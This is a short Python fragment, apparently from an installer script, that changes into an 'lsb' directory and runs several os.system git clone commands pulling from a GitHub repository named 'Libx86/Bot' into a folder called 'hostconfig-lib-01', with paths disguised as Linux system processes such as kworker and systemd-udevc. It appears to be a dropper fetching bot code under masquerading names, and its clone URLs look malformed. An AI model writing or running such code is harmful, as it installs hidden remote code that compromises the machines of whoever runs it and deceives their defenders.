...
os.chdir("lsb")
os.system("git clone https://github.com/Libx86/Bot.git/kworker_v8U:023FWE234-0 hostconfig-lib-01")
os.system("git clone https://github.com/Libx86/Bot.git/systemd-udevc hostconfig-lib-01")
os.system("git clone https://github.com/Libx86/Bot.git/at-spi2-regist3r.01F  hostconfig-lib-01")
